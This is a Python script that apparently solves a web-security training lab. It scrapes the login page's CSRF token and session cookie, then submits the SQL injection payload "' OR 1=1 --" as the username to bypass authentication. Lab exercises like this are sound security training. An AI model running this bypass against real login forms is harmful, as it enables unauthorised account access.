import requests
from colorama import Fore
import re

LAB_URL = "https://0aac002f03e07430819cd49200980003.web-security-academy.net"
print(LAB_URL)

def main():
    payload = "' OR 1=1 --"
    print(Fore.WHITE + "⦗1⦘ Fetching the login page.. ", end="", flush=True)
    login_page = fetch(f"/login")

    print(login_page)
    
    print(Fore.GREEN + "OK")

    print(Fore.WHITE + "⦗2⦘ Extracting the csrf token & session", end="", flush=True)
    
    csrf_token = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]
    session = login_page.cookies.get("session")
    
    data = {"csrf": {csrf_token}, "username": payload, "password": "test" }
    cookies = { "session": session }

    print(Fore.WHITE + "(3) Injecting payload in username field")
    admin_login = post_data("/login", data, cookies)
    print(admin_login)



def fetch(path, cookies=None):
    try:
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except Exception as e:
        print(Fore.RED + f"⦗!⦘ Failed to fetch {path} through exception: {e}")
        exit(1)

def post_data(path, data, cookies):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, cookies=cookies, allow_redirects=True)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)

if __name__ == "__main__":
    main() 